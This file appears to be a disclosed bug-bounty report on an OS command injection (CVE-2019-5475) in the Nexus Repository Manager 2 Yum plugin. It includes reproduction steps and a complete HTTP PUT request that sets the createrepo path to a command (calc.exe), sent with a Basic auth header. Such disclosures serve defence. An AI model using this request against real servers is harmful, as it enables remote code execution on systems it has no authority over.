@@ -1,0 +1,54 @@
+ReportLink:https://hackerone.com/reports/654888
+WeaknessName:OS Command Injection
+Reporter:https://hackerone.com/cbagdude
+ReportedTo:Central Security Project(central-security-project)
+BountyAmount:
+Severity:critical
+State:Closed
+DateOfDisclosure:20.08.2019 19:55:59
+
+Summary:
+https://support.sonatype.com/hc/en-us/articles/360033490774-CVE-2019-5475-Nexus-Repository-Manager-2-OS-Command-Injection-2019-08-09
+# Maven artifact
+**groupId:** org.sonatype.nexus.plugins
+**artifactId:** nexus-yum-repository-plugin
+**version:** 2.14.9-01
+
+# Vulnerability
+## Vulnerability Description
+The Nexus Yum Repository Plugin is vulnerable to Remote Code Execution. All instances using CommandLineExecutor.java with user-supplied data is vulnerable, such as the Yum Configuration Capability. 
+
+## Additional Details
+**Source File and Line Number:** https://github.com/sonatype/nexus-public/blob/release-2.14.9-01/plugins/yum/nexus-yum-repository-plugin/src/main/java/org/sonatype/nexus/yum/internal/capabilities/YumCapability.java#L121
+
+## Steps To Reproduce:
+1. Navigate to "Capabilities" in Nexus Repository Manager.
+2. Edit or create a new Yum: Configuration capability
+3. Set path of "createrepo" or "mergerepo" to an OS command (e.g. C:\Windows\System32\calc.exe)
+4. The OS command should now have executed as the SYSTEM user. Note that in this case, Nexus appends --version to the OS command.
+
+The following HTTP request was used to trigger the vulnerability:
+```
+PUT /nexus/service/siesta/capabilities/000013ea3743a556 HTTP/1.1
+Host: HOST:PORT
+Accept: application/json
+Authorization: Basic YWRtaW46YWRtaW4xMjM=
+Content-Type: application/xml
+Content-Length: 333
+Connection: close
+
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<ns2:capability xmlns:ns2="http://sonatype.org/xsd/nexus-capabilities-plugin/rest/1.0"><id>healthcheck</id><notes>123</notes><enabled>true</enabled><typeId>1</typeId><properties><key>createrepoPath</key><value>C:\Windows\System32\calc.exe</value></properties></ns2:capability>
+```
+## Supporting Material/References:
+- Windows Server 2016
+- Sonatype Nexus Repository Manager 2.14.9-01
+- Java 8
+
+# Wrap up
+- I contacted the maintainer to let them know: N
+- I opened an issue in the related repository: N
+
+## Impact
+
+An authenticated user with sufficient privileges in a Nexus Repository Manager installation can exploit this to execute code on the underlying operating system.
